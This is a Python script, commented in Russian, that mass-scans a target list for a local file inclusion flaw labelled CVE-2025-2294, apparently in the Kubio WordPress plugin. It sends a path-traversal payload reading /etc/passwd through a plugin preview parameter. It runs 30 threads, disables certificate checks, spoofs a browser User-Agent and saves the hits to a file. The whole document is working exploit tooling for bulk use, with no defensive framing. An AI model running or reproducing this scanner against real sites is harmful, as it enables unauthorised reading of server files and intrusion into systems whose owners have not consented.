import requests
import re
import urllib3
import argparse
from urllib.parse import urlparse, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Список LFI payload'ов
payloads = [
    "../../../../../../../../../etc/passwd"
]

# Улучшенный паттерн: ищем любые признаки passwd
pattern = re.compile(r"(root:.*:0:0:|/bin/bash|/root)")

# Заголовки (эмулируем нормальный браузер)
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "keep-alive"
}

def normalize_url(url):
    """Нормализует URL: убирает порты 80/443, удаляет слеш на конце."""
    url = url.strip()

    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url  # по умолчанию считаем https

    parsed = urlparse(url)
    scheme = parsed.scheme
    netloc = parsed.netloc
    path = parsed.path.rstrip("/")

    if scheme == "https" and netloc.endswith(":443"):
        netloc = netloc[:-4]
    elif scheme == "http" and netloc.endswith(":80"):
        netloc = netloc[:-3]

    return urlunparse((scheme, netloc, path, '', '', ''))

def load_targets(filename):
    """Загружает цели из файла и нормализует их."""
    with open(filename, "r") as file:
        lines = {normalize_url(line) for line in file if line.strip()}
    return list(lines)

def check_target(target):
    """Проверяет одну цель на LFI уязвимость."""
    for payload in payloads:
        url = (f"{target}/?__kubio-site-edit-iframe-preview=1&"
               f"__kubio-site-edit-iframe-classic-template={payload}")
        try:
            response = requests.get(
                url,
                headers=headers,
                allow_redirects=True,
                timeout=15,
                verify=False
            )
            if response.status_code in [200, 301, 302]:  # допускаем редиректы
                if pattern.search(response.text):
                    return target
        except requests.RequestException:
            # Пытаемся ещё раз один раз
            try:
                response = requests.get(
                    url,
                    headers=headers,
                    allow_redirects=True,
                    timeout=20,
                    verify=False
                )
                if response.status_code in [200, 301, 302]:
                    if pattern.search(response.text):
                        return target
            except:
                continue
    return None

def main():
    """Основная функция сканирования."""
    parser = argparse.ArgumentParser(description="Улучшенный сканер LFI для CVE-2025-2294.")
    parser.add_argument("-i", "--input", required=True, help="Файл с целями для проверки (например, targets.txt).")
    parser.add_argument("-o", "--output", required=True, help="Файл для записи уязвимых целей (например, vuln.txt).")
    args = parser.parse_args()

    targets = load_targets(args.input)

    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {
            executor.submit(check_target, target): target
            for target in targets
        }

        with open(args.output, "w") as out:
            for future in as_completed(futures):
                result = future.result()
                if result:
                    print(result)
                    out.write(result + "\n")

if __name__ == "__main__":
    main()
